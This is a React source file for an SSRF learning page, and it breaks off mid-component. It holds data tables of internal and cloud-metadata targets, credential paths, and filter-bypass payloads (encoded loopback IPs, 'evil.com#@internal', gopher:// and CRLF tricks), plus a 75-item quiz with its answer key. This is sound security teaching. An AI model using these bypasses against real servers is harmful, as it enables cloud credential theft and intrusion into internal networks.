import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Typography,
  Container,
  Paper,
  Alert,
  AlertTitle,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Grid,
  Card,
  CardContent,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Chip,
  Divider,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Button,
  Tooltip,
  alpha,
  useTheme,
  useMediaQuery,
  Drawer,
  Fab,
  LinearProgress,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import CloudIcon from "@mui/icons-material/Cloud";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import StorageIcon from "@mui/icons-material/Storage";
import PublicIcon from "@mui/icons-material/Public";
import LockIcon from "@mui/icons-material/Lock";
import WarningIcon from "@mui/icons-material/Warning";
import SearchIcon from "@mui/icons-material/Search";
import ShieldIcon from "@mui/icons-material/Shield";
import CodeIcon from "@mui/icons-material/Code";
import BuildIcon from "@mui/icons-material/Build";
import HistoryIcon from "@mui/icons-material/History";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import CancelIcon from "@mui/icons-material/Cancel";
import DnsIcon from "@mui/icons-material/Dns";
import HttpIcon from "@mui/icons-material/Http";
import LanguageIcon from "@mui/icons-material/Language";
import LinkIcon from "@mui/icons-material/Link";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import SchoolIcon from "@mui/icons-material/School";
import SpeedIcon from "@mui/icons-material/Speed";
import VpnLockIcon from "@mui/icons-material/VpnLock";

// Code block component
interface CodeBlockProps {
  title?: string;
  children: string;
}

function CodeBlock({ title, children }: CodeBlockProps) {
  const [copied, setCopied] = useState(false);
  const theme = useTheme();

  const handleCopy = () => {
    navigator.clipboard.writeText(children);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        mt: 2,
        mb: 2,
        overflow: "hidden",
        border: `1px solid ${alpha(theme.palette.primary.main, 0.2)}`,
      }}
    >
      {title && (
        <Box
          sx={{
            px: 2,
            py: 1,
            bgcolor: alpha(theme.palette.primary.main, 0.1),
            borderBottom: `1px solid ${alpha(theme.palette.primary.main, 0.2)}`,
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <Typography variant="caption" fontWeight="bold" color="primary">
            {title}
          </Typography>
          <Tooltip title={copied ? "Copied!" : "Copy"}>
            <IconButton size="small" onClick={handleCopy}>
              <ContentCopyIcon fontSize="small" />
            </IconButton>
          </Tooltip>
        </Box>
      )}
      <Box
        component="pre"
        sx={{
          m: 0,
          p: 2,
          overflow: "auto",
          bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#f8f9fa",
          fontSize: "0.85rem",
          fontFamily: "monospace",
        }}
      >
        <code>{children}</code>
      </Box>
    </Paper>
  );
}

// Data arrays
const ssrfTypes = [
  { type: "Basic SSRF", desc: "Direct request to attacker-controlled URL", severity: "High", example: "Fetch URL parameter directly used in server request" },
  { type: "Blind SSRF", desc: "No direct response, must infer via timing/side-channels", severity: "Medium", example: "Webhook URL that doesn't return response content" },
  { type: "Semi-Blind SSRF", desc: "Partial response data returned (headers, status codes)", severity: "Medium", example: "Error messages reveal internal network info" },
  { type: "Full-Response SSRF", desc: "Complete response returned to attacker", severity: "Critical", example: "URL preview feature shows full page content" },
];

const commonTargets = [
  { target: "Cloud Metadata", endpoint: "169.254.169.254", risk: "Credential theft, instance takeover", protocol: "HTTP" },
  { target: "Internal APIs", endpoint: "localhost:8080", risk: "Authentication bypass, data access", protocol: "HTTP/HTTPS" },
  { target: "Admin Panels", endpoint: "127.0.0.1:8000/admin", risk: "Full system compromise", protocol: "HTTP" },
  { target: "Databases", endpoint: "internal-db:5432", risk: "Data exfiltration", protocol: "PostgreSQL" },
  { target: "Redis/Memcache", endpoint: "127.0.0.1:6379", risk: "Cache poisoning, RCE", protocol: "Redis/Gopher" },
  { target: "Elasticsearch", endpoint: "localhost:9200", risk: "Data access, cluster control", protocol: "HTTP" },
  { target: "Docker API", endpoint: "127.0.0.1:2375", risk: "Container escape, host compromise", protocol: "HTTP" },
  { target: "Kubernetes API", endpoint: "kubernetes.default.svc", risk: "Cluster takeover", protocol: "HTTPS" },
];

const bypassTechniques = [
  { technique: "IP Encoding (Decimal)", example: "2130706433", desc: "127.0.0.1 as decimal integer" },
  { technique: "IP Encoding (Octal)", example: "0177.0.0.1 or 017700000001", desc: "Octal representation" },
  { technique: "IP Encoding (Hex)", example: "0x7f.0x0.0x0.0x1 or 0x7f000001", desc: "Hexadecimal representation" },
  { technique: "IPv6 Localhost", example: "::1, ::ffff:127.0.0.1", desc: "IPv6 loopback addresses" },
  { technique: "DNS Rebinding", example: "attacker.com → 127.0.0.1", desc: "DNS record changes between checks" },
  { technique: "URL Parsing Confusion", example: "http://evil.com#@internal", desc: "Exploit parser differences" },
  { technique: "Protocol Smuggling", example: "gopher://, dict://, file://", desc: "Alternative protocols" },
  { technique: "Redirect Chains", example: "302 → 302 → internal", desc: "External redirects to internal" },
  { technique: "URL Shorteners", example: "bit.ly/xxx → internal", desc: "Hide target behind shortener" },
  { technique: "Wildcard DNS", example: "127.0.0.1.nip.io", desc: "DNS services that resolve to any IP" },
  { technique: "Unicode/Punycode", example: "ⓛⓞⓒⓐⓛⓗⓞⓢⓣ", desc: "Unicode domain normalization" },
  { technique: "CRLF Injection", example: "url%0d%0aHost:%20internal", desc: "HTTP header injection" },
];

const preventionMethods = [
  { method: "Input Validation", desc: "Whitelist allowed URLs and domains", priority: "Critical" },
  { method: "Network Segmentation", desc: "Isolate sensitive services from web tier", priority: "High" },
  { method: "Disable Protocols", desc: "Block file://, gopher://, dict://", priority: "High" },
  { method: "Metadata Blocking", desc: "Block 169.254.169.254 at network level", priority: "Critical" },
  { method: "Response Filtering", desc: "Don't return raw responses to users", priority: "Medium" },
  { method: "Timeout Controls", desc: "Limit request duration", priority: "Medium" },
  { method: "DNS Resolution Check", desc: "Validate resolved IP addresses", priority: "Critical" },
  { method: "Egress Firewall", desc: "Control outbound connections", priority: "High" },
];

const realWorldBreaches = [
  { company: "Capital One (2019)", impact: "100M+ customer records", method: "AWS metadata SSRF", bounty: "N/A - Criminal case" },
  { company: "Shopify", impact: "Internal systems access", method: "SSRF in merchant dashboard", bounty: "$25,000" },
  { company: "GitLab", impact: "Internal network scanning", method: "Webhook SSRF", bounty: "$12,000" },
  { company: "Uber", impact: "AWS credentials exposed", method: "SSRF in image processing", bounty: "$10,000" },
  { company: "Facebook", impact: "Internal infrastructure", method: "SSRF in career portal", bounty: "$31,500" },
];

const vulnerableFunctions = [
  { lang: "Python", func: "requests.get(url)", lib: "requests", risk: "High" },
  { lang: "Python", func: "urllib.request.urlopen(url)", lib: "urllib", risk: "High" },
  { lang: "Python", func: "httpx.get(url)", lib: "httpx", risk: "High" },
  { lang: "Node.js", func: "axios.get(url)", lib: "axios", risk: "High" },
  { lang: "Node.js", func: "fetch(url)", lib: "node-fetch", risk: "High" },
  { lang: "Node.js", func: "http.get(url)", lib: "http", risk: "High" },
  { lang: "Java", func: "URL.openConnection()", lib: "java.net", risk: "High" },
  { lang: "Java", func: "HttpClient.send()", lib: "java.net.http", risk: "High" },
  { lang: "PHP", func: "file_get_contents(url)", lib: "core", risk: "Critical" },
  { lang: "PHP", func: "curl_exec()", lib: "curl", risk: "High" },
  { lang: "Ruby", func: "Net::HTTP.get(url)", lib: "net/http", risk: "High" },
  { lang: "Go", func: "http.Get(url)", lib: "net/http", risk: "High" },
];

const cloudMetadataEndpoints = [
  { provider: "AWS", endpoint: "http://169.254.169.254/latest/meta-data/", sensitive: "iam/security-credentials/" },
  { provider: "AWS IMDSv2", endpoint: "Token required via PUT request", sensitive: "Harder to exploit" },
  { provider: "GCP", endpoint: "http://metadata.google.internal/computeMetadata/v1/", sensitive: "instance/service-accounts/" },
  { provider: "Azure", endpoint: "http://169.254.169.254/metadata/instance", sensitive: "?api-version=2021-02-01" },
  { provider: "DigitalOcean", endpoint: "http://169.254.169.254/metadata/v1/", sensitive: "user-data, region" },
  { provider: "Oracle Cloud", endpoint: "http://169.254.169.254/opc/v1/", sensitive: "instance/metadata/" },
  { provider: "Alibaba Cloud", endpoint: "http://100.100.100.200/latest/meta-data/", sensitive: "ram/security-credentials/" },
  { provider: "Kubernetes", endpoint: "https://kubernetes.default.svc/api/v1/", sensitive: "secrets, configmaps" },
];

const ssrfTools = [
  { name: "Burp Collaborator", type: "Detection", desc: "Out-of-band interaction detection" },
  { name: "SSRFmap", type: "Exploitation", desc: "Automatic SSRF fuzzer and exploitation" },
  { name: "Gopherus", type: "Payload Gen", desc: "Generate gopher payloads for various services" },
  { name: "ffuf", type: "Fuzzing", desc: "Fast web fuzzer for parameter discovery" },
  { name: "nuclei", type: "Scanning", desc: "SSRF templates for automated detection" },
  { name: "interactsh", type: "Detection", desc: "Open-source OOB interaction server" },
];

const ACCENT_COLOR = "#3b82f6";
const QUIZ_QUESTION_COUNT = 10;

const selectRandomQuestions = (questions: QuizQuestion[], count: number) =>
  [...questions].sort(() => Math.random() - 0.5).slice(0, count);

// Section Navigation Items
const sectionNavItems = [
  { id: "intro", label: "Introduction", icon: <CloudIcon /> },
  { id: "attack-types", label: "Attack Types", icon: <BugReportIcon /> },
  { id: "discovery", label: "Discovery", icon: <SearchIcon /> },
  { id: "exploitation", label: "Exploitation", icon: <WarningIcon /> },
  { id: "cloud-attacks", label: "Cloud Attacks", icon: <StorageIcon /> },
  { id: "prevention", label: "Prevention", icon: <ShieldIcon /> },
  { id: "tools", label: "Tools", icon: <BuildIcon /> },
  { id: "code-examples", label: "Code Examples", icon: <CodeIcon /> },
  { id: "quiz", label: "Knowledge Check", icon: <SchoolIcon /> },
];

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "SSRF allows an attacker to:",
    options: [
      "Make a server send requests to unintended locations",
      "Execute code in the browser",
      "Bypass SQL constraints",
      "Modify DNS records directly",
    ],
    correctAnswer: 0,
    explanation: "SSRF abuses server-side requests to reach internal targets.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "Why is SSRF dangerous?",
    options: [
      "Servers can access internal networks and metadata",
      "It only affects images",
      "It only changes UI",
      "It requires local access",
    ],
    correctAnswer: 0,
    explanation: "Servers often have access to internal services and metadata.",
  },
  {
    id: 3,
    topic: "Types",
    question: "Basic SSRF is:",
    options: [
      "A direct request to an attacker-controlled URL",
      "No response and no side effects",
      "Only timing based",
      "Only via DNS",
    ],
    correctAnswer: 0,
    explanation: "Basic SSRF uses direct, attacker-controlled URLs.",
  },
  {
    id: 4,
    topic: "Types",
    question: "Blind SSRF is detected by:",
    options: ["Timing or out-of-band signals", "Full response content", "Browser popups", "SQL errors"],
    correctAnswer: 0,
    explanation: "Blind SSRF requires side channels or OOB detection.",
  },
  {
    id: 5,
    topic: "Types",
    question: "Full-response SSRF means:",
    options: ["The server returns the fetched content", "No content is returned", "Only status codes are shown", "Only timing is visible"],
    correctAnswer: 0,
    explanation: "Full-response SSRF exposes the entire response.",
  },
  {
    id: 6,
    topic: "OWASP",
    question: "SSRF was added to the OWASP Top 10 in:",
    options: ["2021", "2013", "2017", "2023"],
    correctAnswer: 0,
    explanation: "SSRF appears in the 2021 OWASP Top 10 list.",
  },
  {
    id: 7,
    topic: "Entry Points",
    question: "A common SSRF entry point is:",
    options: ["URL fetch or webhook feature", "Static HTML", "CSS files", "Client-only storage"],
    correctAnswer: 0,
    explanation: "URL fetchers and webhooks often accept user URLs.",
  },
  {
    id: 8,
    topic: "Entry Points",
    question: "A profile image URL feature can be risky because:",
    options: ["It may fetch attacker-supplied URLs", "It runs in the browser only", "It never touches servers", "It blocks all URLs"],
    correctAnswer: 0,
    explanation: "Server-side fetches can be abused for SSRF.",
  },
  {
    id: 9,
    topic: "Targets",
    question: "A high-value SSRF target is:",
    options: ["Cloud metadata services", "Public CSS", "User avatars", "Static icons"],
    correctAnswer: 0,
    explanation: "Metadata services can expose credentials.",
  },
  {
    id: 10,
    topic: "Targets",
    question: "The AWS metadata IP is:",
    options: ["169.254.169.254", "127.0.0.1", "10.0.0.1", "8.8.8.8"],
    correctAnswer: 0,
    explanation: "AWS metadata is served from a link-local address.",
  },
  {
    id: 11,
    topic: "Targets",
    question: "The GCP metadata host is:",
    options: ["metadata.google.internal", "metadata.aws.local", "meta.azure.internal", "metadata.cloud"],
    correctAnswer: 0,
    explanation: "GCP metadata is available via metadata.google.internal.",
  },
  {
    id: 12,
    topic: "Targets",
    question: "Azure metadata is accessed at:",
    options: ["169.254.169.254 with an api-version", "127.0.0.1:8080", "kubernetes.default.svc", "10.10.10.10"],
    correctAnswer: 0,
    explanation: "Azure uses the link-local endpoint with api-version.",
  },
  {
    id: 13,
    topic: "Targets",
    question: "SSRF can access internal APIs because:",
    options: ["The server can reach internal networks", "The browser bypasses TLS", "DNS is disabled", "Cookies are missing"],
    correctAnswer: 0,
    explanation: "Servers often have internal network access.",
  },
  {
    id: 14,
    topic: "Impact",
    question: "SSRF can be used for:",
    options: ["Internal port scanning", "Client-side XSS", "Keyboard logging", "Local file browsing"],
    correctAnswer: 0,
    explanation: "Changing ports helps map internal services.",
  },
  {
    id: 15,
    topic: "Impact",
    question: "SSRF can bypass IP allowlists because:",
    options: ["The request comes from the trusted server", "Headers are encrypted", "TLS is disabled", "DNS is cached"],
    correctAnswer: 0,
    explanation: "Allowlists often trust the server IP.",
  },
  {
    id: 16,
    topic: "Bypass",
    question: "IP decimal encoding can bypass filters by using:",
    options: ["2130706433 for 127.0.0.1", "127.0.0.1 only", "localhost only", "::1 only"],
    correctAnswer: 0,
    explanation: "Decimal form can evade naive filters.",
  },
  {
    id: 17,
    topic: "Bypass",
    question: "IP octal encoding can look like:",
    options: ["0177.0.0.1", "0x7f000001", "127.0.0.1", "localhost"],
    correctAnswer: 0,
    explanation: "Octal encoding can evade blocklists.",
  },
  {
    id: 18,
    topic: "Bypass",
    question: "IP hex encoding can look like:",
    options: ["0x7f000001", "0177.0.0.1", "2130706433", "127.0.0.1"],
    correctAnswer: 0,
    explanation: "Hex encoding is another common bypass.",
  },
  {
    id: 19,
    topic: "Bypass",
    question: "An IPv6 loopback address is:",
    options: ["::1", "::2", "2001:db8::1", "fe80::1"],
    correctAnswer: 0,
    explanation: "::1 is the IPv6 loopback address.",
  },
  {
    id: 20,
    topic: "Bypass",
    question: "DNS rebinding works by:",
    options: ["Changing DNS answers over time", "Encrypting DNS", "Disabling DNS", "Caching forever"],
    correctAnswer: 0,
    explanation: "DNS responses can change between checks.",
  },
  {
    id: 21,
    topic: "Bypass",
    question: "URL parser confusion can use:",
    options: ["http://evil.com@internal", "only https", "only localhost", "only IPv6"],
    correctAnswer: 0,
    explanation: "Userinfo or fragments can confuse parsers.",
  },
  {
    id: 22,
    topic: "Bypass",
    question: "Redirect chains are used to:",
    options: ["Hop from an external URL to an internal one", "Encrypt responses", "Block access", "Increase caching"],
    correctAnswer: 0,
    explanation: "Open redirects can pivot to internal targets.",
  },
  {
    id: 23,
    topic: "Bypass",
    question: "Protocol smuggling can use:",
    options: ["gopher://", "mailto:", "ftp:// only", "file:// only"],
    correctAnswer: 0,
    explanation: "Gopher can send raw TCP payloads.",
  },
  {
    id: 24,
    topic: "Bypass",
    question: "The file:// scheme is risky because it can:",
    options: ["Read local files", "Encrypt files", "Patch systems", "Update DNS"],
    correctAnswer: 0,
    explanation: "file:// can access local file paths.",
  },
  {
    id: 25,
    topic: "Bypass",
    question: "CRLF injection can allow:",
    options: ["Header manipulation in requests", "Faster TLS", "Better caching", "Session renewal"],
    correctAnswer: 0,
    explanation: "CRLF can inject new headers.",
  },
  {
    id: 26,
    topic: "Bypass",
    question: "Wildcard DNS services can be used as:",
    options: ["127.0.0.1.nip.io", "example.com", "localhost", "10.0.0.1"],
    correctAnswer: 0,
    explanation: "Wildcard DNS maps hostnames to chosen IPs.",
  },
  {
    id: 27,
    topic: "Bypass",
    question: "URL shorteners can:",
    options: ["Hide internal targets behind redirects", "Fix validation", "Add auth", "Prevent SSRF"],
    correctAnswer: 0,
    explanation: "Shorteners can obscure the final URL.",
  },
  {
    id: 28,
    topic: "Prevention",
    question: "A strong mitigation is:",
    options: ["Hostname allowlists", "Only hiding errors", "Only client-side checks", "Allowing all IPs"],
    correctAnswer: 0,
    explanation: "Allowlists restrict destinations.",
  },
  {
    id: 29,
    topic: "Prevention",
    question: "Block which range to stop metadata access?",
    options: ["169.254.0.0/16", "8.8.8.0/24", "1.1.1.0/24", "224.0.0.0/4"],
    correctAnswer: 0,
    explanation: "169.254.0.0/16 is link-local metadata range.",
  },
  {
    id: 30,
    topic: "Prevention",
    question: "Validation should check resolved IPs to:",
    options: ["Catch DNS rebinding", "Improve UI", "Enable caching", "Reduce logging"],
    correctAnswer: 0,
    explanation: "Resolve and validate all IPs after DNS lookup.",
  },
  {
    id: 31,
    topic: "Prevention",
    question: "Disabling redirects helps because:",
    options: ["Redirects can jump to internal targets", "It speeds DNS", "It encrypts traffic", "It increases logs"],
    correctAnswer: 0,
    explanation: "Redirects can bypass allowlists.",
  },
  {
    id: 32,
    topic: "Prevention",
    question: "An egress firewall is used to:",
    options: ["Control outbound connections", "Filter browser cookies", "Encrypt disks", "Rotate logs"],
    correctAnswer: 0,
    explanation: "Egress controls restrict where servers can connect.",
  },
  {
    id: 33,
    topic: "Prevention",
    question: "Allowing only http/https helps by:",
    options: ["Blocking file and gopher protocols", "Enabling redirects", "Disabling TLS", "Allowing all schemes"],
    correctAnswer: 0,
    explanation: "Scheme allowlists prevent protocol smuggling.",
  },
  {
    id: 34,
    topic: "Prevention",
    question: "Timeout controls help prevent:",
    options: ["Long-running SSRF abuse", "JWT tampering", "XSS", "CSRF"],
    correctAnswer: 0,
    explanation: "Timeouts limit resource usage.",
  },
  {
    id: 35,
    topic: "Prevention",
    question: "Response filtering reduces risk by:",
    options: ["Not returning internal data to users", "Disabling DNS", "Allowing all IPs", "Skipping validation"],
    correctAnswer: 0,
    explanation: "Avoid exposing fetched internal responses.",
  },
  {
    id: 36,
    topic: "Cloud",
    question: "AWS IMDSv2 requires:",
    options: ["A session token via PUT", "No token", "Only GET", "Only POST"],
    correctAnswer: 0,
    explanation: "IMDSv2 uses a token obtained with PUT.",
  },
  {
    id: 37,
    topic: "Cloud",
    question: "Kubernetes API default service is:",
    options: ["kubernetes.default.svc", "metadata.google.internal", "localhost:2375", "169.254.169.254"],
    correctAnswer: 0,
    explanation: "The Kubernetes API service is kubernetes.default.svc.",
  },
  {
    id: 38,
    topic: "Targets",
    question: "Redis is often targeted via:",
    options: ["gopher:// payloads", "mailto:", "file:// only", "ssh:// only"],
    correctAnswer: 0,
    explanation: "Gopher can send raw Redis commands.",
  },
  {
    id: 39,
    topic: "Targets",
    question: "The Docker API default port is:",
    options: ["2375", "3306", "5432", "9200"],
    correctAnswer: 0,
    explanation: "Docker API often listens on 2375 when unsecured.",
  },
  {
    id: 40,
    topic: "Targets",
    question: "Elasticsearch default port is:",
    options: ["9200", "2375", "6379", "11211"],
    correctAnswer: 0,
    explanation: "Elasticsearch commonly listens on 9200.",
  },
  {
    id: 41,
    topic: "Types",
    question: "Semi-blind SSRF often returns:",
    options: ["Headers or status codes", "Full response bodies", "Only images", "No response at all"],
    correctAnswer: 0,
    explanation: "Semi-blind SSRF leaks limited response info.",
  },
  {
    id: 42,
    topic: "Types",
    question: "Full-response SSRF allows:",
    options: ["Data exfiltration through the response", "Only timing", "Only logging", "Only redirects"],
    correctAnswer: 0,
    explanation: "Full response can reveal internal data.",
  },
  {
    id: 43,
    topic: "Detection",
    question: "A common OOB SSRF tool is:",
    options: ["Burp Collaborator", "Nmap", "Hashcat", "Aircrack"],
    correctAnswer: 0,
    explanation: "Collaborator detects external interactions.",
  },
  {
    id: 44,
    topic: "Tools",
    question: "SSRFmap is used for:",
    options: ["Automated SSRF exploitation", "Password cracking", "DNS hosting", "Log analysis"],
    correctAnswer: 0,
    explanation: "SSRFmap automates SSRF testing and exploitation.",
  },
  {
    id: 45,
    topic: "Tools",
    question: "Interactsh provides:",
    options: ["Out-of-band interaction detection", "Firewall rules", "TLS certificates", "DNS caching"],
    correctAnswer: 0,
    explanation: "Interactsh is for OOB detection.",
  },
  {
    id: 46,
    topic: "Tools",
    question: "Nuclei can help by:",
    options: ["Running SSRF templates", "Disabling TLS", "Generating passwords", "Fixing code"],
    correctAnswer: 0,
    explanation: "Nuclei runs automated SSRF checks.",
  },
  {
    id: 47,
    topic: "Prevention",
    question: "Validating the final IP after redirects helps:",
    options: ["Prevent redirect-based bypass", "Increase cache hits", "Avoid TLS", "Enable gopher"],
    correctAnswer: 0,
    explanation: "Redirects can change the destination.",
  },
  {
    id: 48,
    topic: "Impact",
    question: "SSRF to metadata can expose:",
    options: ["Temporary cloud credentials", "User passwords in UI", "Browser history", "Static assets"],
    correctAnswer: 0,
    explanation: "Metadata often contains IAM credentials.",
  },
  {
    id: 49,
    topic: "Impact",
    question: "SSRF can lead to:",
    options: ["Internal network mapping", "Stronger encryption", "Lower latency", "Better UX"],
    correctAnswer: 0,
    explanation: "SSRF can scan internal hosts and ports.",
  },
  {
    id: 50,
    topic: "Impact",
    question: "SSRF can result in:",
    options: ["Data exfiltration", "Only UI changes", "Only caching", "Only redirects"],
    correctAnswer: 0,
    explanation: "Internal data can be accessed or leaked.",
  },
  {
    id: 51,
    topic: "Validation",
    question: "Parsing URLs should reject:",
    options: ["Userinfo trickery like user@host", "Valid HTTPS URLs", "Known domains", "Standard ports"],
    correctAnswer: 0,
    explanation: "Userinfo can confuse parsers and validators.",
  },
  {
    id: 52,
    topic: "Prevention",
    question: "Blocking private ranges includes:",
    options: ["10.0.0.0/8 and 192.168.0.0/16", "8.8.8.0/24", "1.1.1.0/24", "224.0.0.0/4"],
    correctAnswer: 0,
    explanation: "Private ranges should be blocked.",
  },
  {
    id: 53,
    topic: "Prevention",
    question: "Loopback addresses are in:",
    options: ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"],
    correctAnswer: 0,
    explanation: "127.0.0.0/8 is loopback.",
  },
  {
    id: 54,
    topic: "Prevention",
    question: "Disallowing file:// and gopher:// is:",
    options: ["Protocol allowlisting", "DNS rebinding", "Rate limiting", "Token rotation"],
    correctAnswer: 0,
    explanation: "Allowlisting schemes blocks dangerous protocols.",
  },
  {
    id: 55,
    topic: "Detection",
    question: "Monitoring outbound traffic to 169.254.169.254 helps detect:",
    options: ["Metadata SSRF attempts", "SQL injection", "XSS", "CSRF"],
    correctAnswer: 0,
    explanation: "Metadata access is a key SSRF indicator.",
  },
  {
    id: 56,
    topic: "Logging",
    question: "Which log field is important for SSRF detection?",
    options: ["Destination host and port", "User agent only", "Screen size", "Font settings"],
    correctAnswer: 0,
    explanation: "Destination data shows internal access attempts.",
  },
  {
    id: 57,
    topic: "Entry Points",
    question: "A webhook callback URL feature is risky because:",
    options: ["It may call attacker-chosen URLs", "It only runs client-side", "It uses no network", "It blocks input"],
    correctAnswer: 0,
    explanation: "Webhooks often send server-side requests.",
  },
  {
    id: 58,
    topic: "Entry Points",
    question: "A file import by URL can enable:",
    options: ["SSRF to internal services", "TLS pinning", "Cookie protection", "HSTS"],
    correctAnswer: 0,
    explanation: "Import features often fetch arbitrary URLs.",
  },
  {
    id: 59,
    topic: "Bypass",
    question: "Why are redirects dangerous?",
    options: ["They can bypass allowlists", "They disable DNS", "They encrypt traffic", "They block private IPs"],
    correctAnswer: 0,
    explanation: "Redirects can change the final destination.",
  },
  {
    id: 60,
    topic: "Cloud",
    question: "GCP metadata typically requires the header:",
    options: ["Metadata-Flavor: Google", "Authorization: Bearer", "X-API-Key", "Accept: */*"],
    correctAnswer: 0,
    explanation: "GCP requires Metadata-Flavor: Google.",
  },
  {
    id: 61,
    topic: "Prevention",
    question: "Why validate DNS after resolution?",
    options: ["A hostname can resolve to internal IPs", "It improves caching", "It speeds requests", "It enables redirects"],
    correctAnswer: 0,
    explanation: "Hostnames can point to private IPs.",
  },
  {
    id: 62,
    topic: "Bypass",
    question: "Using @ in URLs can:",
    options: ["Hide the real host after userinfo", "Encrypt the request", "Disable redirects", "Force HTTPS"],
    correctAnswer: 0,
    explanation: "userinfo can confuse host parsing.",
  },
  {
    id: 63,
    topic: "Bypass",
    question: "Using # in URLs can:",
    options: ["Confuse parsing or validation", "Add headers", "Change DNS", "Set cookies"],
    correctAnswer: 0,
    explanation: "Fragments are ignored by servers but may bypass filters.",
  },
  {
    id: 64,
    topic: "Targets",
    question: "An internal admin panel target might be:",
    options: ["127.0.0.1:8000/admin", "example.com", "cdn.example.com", "public-site.com"],
    correctAnswer: 0,
    explanation: "Admin panels are often bound to localhost.",
  },
  {
    id: 65,
    topic: "Targets",
    question: "Which protocol is often used to talk to Redis?",
    options: ["Gopher", "FTP", "SMTP", "IMAP"],
    correctAnswer: 0,
    explanation: "Gopher can craft raw Redis commands.",
  },
  {
    id: 66,
    topic: "Prevention",
    question: "Why not return raw responses to users?",
    options: ["It can leak internal data", "It is slower", "It breaks TLS", "It disables DNS"],
    correctAnswer: 0,
    explanation: "Raw responses may expose sensitive data.",
  },
  {
    id: 67,
    topic: "Prevention",
    question: "A safe fetch service should:",
    options: ["Run in a restricted network zone", "Share the main database", "Allow all IPs", "Disable logging"],
    correctAnswer: 0,
    explanation: "Network isolation limits SSRF impact.",
  },
  {
    id: 68,
    topic: "Validation",
    question: "Which scheme should be rejected by default?",
    options: ["file://", "https://", "http://", "wss://"],
    correctAnswer: 0,
    explanation: "file:// can access local files.",
  },
  {
    id: 69,
    topic: "Detection",
    question: "Repeated requests to internal ports indicate:",
    options: ["Potential SSRF scanning", "Normal browsing", "TLS handshakes", "User logout"],
    correctAnswer: 0,
    explanation: "Port scanning via SSRF is common.",
  },
  {
    id: 70,
    topic: "Prevention",
    question: "Which is NOT a strong control?",
    options: ["Relying on blacklists only", "Allowlists", "Egress filtering", "DNS validation"],
    correctAnswer: 0,
    explanation: "Blacklists are easy to bypass.",
  },
  {
    id: 71,
    topic: "Impact",
    question: "SSRF can enable:",
    options: ["Credential theft from metadata", "Only UI changes", "Only caching", "Only CSS updates"],
    correctAnswer: 0,
    explanation: "Metadata often contains credentials.",
  },
  {
    id: 72,
    topic: "Prevention",
    question: "Why limit request size?",
    options: ["Reduce abuse and resource exhaustion", "Improve CSS", "Disable auth", "Increase logging"],
    correctAnswer: 0,
    explanation: "Limits prevent resource consumption attacks.",
  },
  {
    id: 73,
    topic: "Bypass",
    question: "Which is a DNS rebinding indicator?",
    options: ["Short TTL and changing IPs", "Long TTL and static IP", "No DNS", "Only IPv6"],
    correctAnswer: 0,
    explanation: "Rebinding uses short TTLs and IP changes.",
  },
  {
    id: 74,
    topic: "Fundamentals",
    question: "SSRF differs from CSRF because:",
    options: ["SSRF is server-side, CSRF uses a user session", "SSRF runs in the browser", "CSRF uses DNS", "SSRF only affects SQL"],
    correctAnswer: 0,
    explanation: "SSRF is server-side; CSRF uses the victim's browser session.",
  },
  {
    id: 75,
    topic: "Prevention",
    question: "The most reliable SSRF defense is:",
    options: ["Strict allowlist plus network egress controls", "Hiding error messages", "Client-side checks", "Using GET only"],
    correctAnswer: 0,
    explanation: "Combine allowlists with strong network controls.",
  },
];


const SSRFGuidePage: React.FC = () => {
  const navigate = useNavigate();
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState("intro");
  const [quizPool] = useState<QuizQuestion[]>(() =>
    selectRandomQuestions(quizQuestions, QUIZ_QUESTION_COUNT)
  );

  const scrollToSection = (id: string) => {
    const el = document.getElementById(id);
    if (el) {
      el.scrollIntoView({ behavior: "smooth", block: "start" });
      setActiveSection(id);
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((s) => s.id);
      for (const id of sections) {
        const el = document.getElementById(id);
        if (el) {
          const rect = el.getBoundingClientRect();
          if (rect.top <= 150 && rect.bottom > 150) {
            setActiveSection(id);
            break;
          }
        }
      }
    };
    window.addEventListener("scroll", handleScroll, { passive: true });
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const pageContext = `This page covers Server-Side Request Forgery (SSRF) vulnerabilities, explaining how attackers trick servers into making requests to unintended locations. Topics include SSRF attack types (basic, blind, full-response), common targets like cloud metadata services (AWS, GCP, Azure), filter bypass techniques (IP encoding, DNS rebinding, protocol smuggling), exploitation methods, and prevention strategies including URL validation, network segmentation, and cloud-specific hardening. Current section: ${activeSection}.`;

  // Sidebar navigation component
  const sidebarNav = (
    <Paper
      sx={{
        p: 2,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        bgcolor: "#12121a",
        border: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
        borderRadius: 2,
      }}
    >
      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: ACCENT_COLOR, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
        <ListAltIcon fontSize="small" />
        Contents
      </Typography>
      <Box sx={{ mb: 2 }}>
        <LinearProgress
          variant="determinate"
